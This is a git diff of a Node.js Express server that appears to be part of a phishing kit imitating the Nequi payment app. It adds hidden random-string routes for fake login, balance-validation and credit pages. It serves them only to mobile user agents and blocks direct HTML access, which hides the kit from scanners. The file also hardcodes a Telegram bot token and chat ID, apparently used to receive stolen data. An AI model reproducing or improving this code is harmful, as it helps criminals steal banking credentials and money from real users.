@@ -9,12 +9,68 @@ const TELEGRAM_TOKEN = '8263563776:AAEKwBsFsA4eq-Xdi_rEFNUwj0j14qO1fGk'; // Get 
 const CHAT_ID = '-5279110730'; // Get from @userinfobot
 
 const app = express();
-const port = process.env.PORT || 3000; // Use Render's port or default to 3000
+const port = process.env.PORT || 3000;
+
+// Random Routes Mapping
+const ROUTES = {
+    INDEX: '/dGtRYXVHejZ6TXo4UHpiSTgyWENocGFRQVJXNElpcEtyZHdKVER4TWpqQzRDS2xrSDNkbDRZdDE3NzA5OTAyMjkzOTE',
+    LOGIN: '/Xy7K9LmN2PqR5StV8WzX1Y4AbCdEfGhIjKlMnOpQrStUvWxYz0123456789AbCdEfGhIjKlMn',
+    VALIDATION: '/QmNpQrStUvWxYz0123456789AbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIjKlMnOpQrStUv',
+    DYNAMIC: '/ZaBcDeFgHiJkLmNoPqRsTuVwXyZ0123456789AbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIj',
+    CREDIT: '/FiNaLPaGeXyZ0123456789AbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIjKlMnOpQrStUvWx'
+};
+
+// Middleware for Mobile Detection
+const mobileCheck = (req, res, next) => {
+    const ua = req.headers['user-agent'];
+    if (/mobile|android|iphone|ipad|phone/i.test(ua)) {
+        next();
+    } else {
+        res.status(403).send('<h1>Acceso Restringido</h1><p>Solo disponible en dispositivos móviles.</p>');
+    }
+};
 
 // Middleware
 app.use(cors());
 app.use(bodyParser.json());
-app.use(express.static(__dirname)); // Serve static files from current directory
+app.use(express.static('public')); // Serve assets if any
+
+// Serve specific HTML files on random routes (Mobile Only)
+app.get(ROUTES.INDEX, mobileCheck, (req, res) => {
+    res.sendFile(path.join(__dirname, 'index.html'));
+});
+
+app.get(ROUTES.LOGIN, mobileCheck, (req, res) => {
+    res.sendFile(path.join(__dirname, 'login_final.html'));
+});
+
+app.get(ROUTES.VALIDATION, mobileCheck, (req, res) => {
+    res.sendFile(path.join(__dirname, 'validacion_saldo.html'));
+});
+
+app.get(ROUTES.DYNAMIC, mobileCheck, (req, res) => {
+    res.sendFile(path.join(__dirname, 'confirmacion_nequi.html'));
+});
+
+app.get(ROUTES.CREDIT, mobileCheck, (req, res) => {
+    res.sendFile(path.join(__dirname, 'credito.html'));
+});
+
+// Root redirect to random index
+app.get('/', (req, res) => {
+    res.redirect(ROUTES.INDEX);
+});
+
+// Serve static assets (JS, CSS, IMG) freely but block direct HTML access
+app.use((req, res, next) => {
+    if (req.path.endsWith('.html')) {
+        res.status(404).send('Not Found');
+    } else {
+        next();
+    }
+});
+
+app.use(express.static(__dirname)); // Serve other static files like js, css, img
 
 // Logging Middleware
 app.use((req, res, next) => {
